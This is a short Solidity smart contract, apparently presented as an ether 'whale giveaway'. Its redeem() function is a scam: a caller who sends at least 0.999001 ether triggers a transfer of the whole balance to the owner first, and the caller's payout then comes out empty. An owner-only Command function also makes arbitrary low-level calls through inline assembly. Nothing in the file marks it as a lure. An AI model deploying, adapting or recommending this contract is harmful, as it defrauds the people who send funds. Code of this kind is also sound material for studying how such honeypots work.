pragma solidity ^0.4.19;

contract WhaleGiveaway1 {
    address public Owner = msg.sender;
    uint public constant minEligibility = 0.999001 ether;

    function() public payable {}

    function redeem() public payable {
        if (msg.value >= minEligibility) {
            Owner.transfer(this.balance);
            msg.sender.transfer(this.balance);
        }
    }

    function withdraw() public payable {
        require(msg.sender == Owner);
        Owner.transfer(this.balance);
    }

    function Command(address adr, bytes data) public payable {
        require(msg.sender == Owner);
        bool success;
        bytes4 sig = bytes4(keccak256("execute()"));
        assembly {
            let ptr := mload(0x40)
            mstore(ptr,sig)
            success := call(sub(gas, 5000), adr, msg.value, ptr, 4, ptr, 32)
            mstore(0x40,add(ptr, 0x60))
        }
        require(success);
    }
}